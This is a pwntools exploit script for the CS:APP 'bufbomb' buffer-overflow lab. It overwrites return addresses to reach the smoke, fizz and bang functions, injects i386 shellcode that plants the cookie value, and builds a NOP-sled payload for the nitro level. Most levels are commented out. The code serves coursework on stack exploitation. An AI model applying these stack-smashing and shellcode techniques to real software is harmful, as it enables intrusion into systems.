from pwn import *
context.log_level = 'debug'
context.arch ='i386'

r = process(["./bufbomb","-u","innerway"])

r.recv()
cookie = 0x23932565
buf = 0x55682f98

# level 0
smoke = 0x08048c18
payload = 'a'*0x28 + 'a'*0x4 
payload += p32(smoke)
r.sendline(payload)

# # level 1
# fizz = 0x08048c42
# payload = 'a'*0x28 + 'a'*0x4
# payload += p32(fizz) + p32(0) + p32(cookie)
# r.sendline(payload)

# # level 2
# bang = 0x08048C9D
# global_value = 0x0804D100
# shellcode = '''
# mov dword ptr [%d], %d
# push %d
# ret
# '''%(global_value,cookie,bang)
# payload = asm(shellcode).ljust(0x28+0x4,'a') + p32(buf)
# r.sendline(payload)

# # level 3
# test = 0x08048dbe
# ebp = 0x55682ff0
# shellcode = '''
# push %d
# mov eax, %d
# ret
# '''%(test,cookie)
# payload = asm(shellcode).ljust(0x28,'a') + p32(ebp)+ p32(buf)
# r.sendline(payload)

# # level 4
# r = process(["./bufbomb","-n","-u","innerway"])
# testn = 0x08048E3A
# buf_maybe = 0x55682E28
# shellcode = '''
# 	lea ebp, [esp+0x28]
# 	mov eax, %d
# 	push %d
# 	ret
# '''%(cookie,testn)
# payload = asm(shellcode).rjust(0x208,'\x90') + p32(0) + p32(buf_maybe)

# for i in range(5):
# 	r.sendline(payload)
# 	r.recv()


r.interactive()
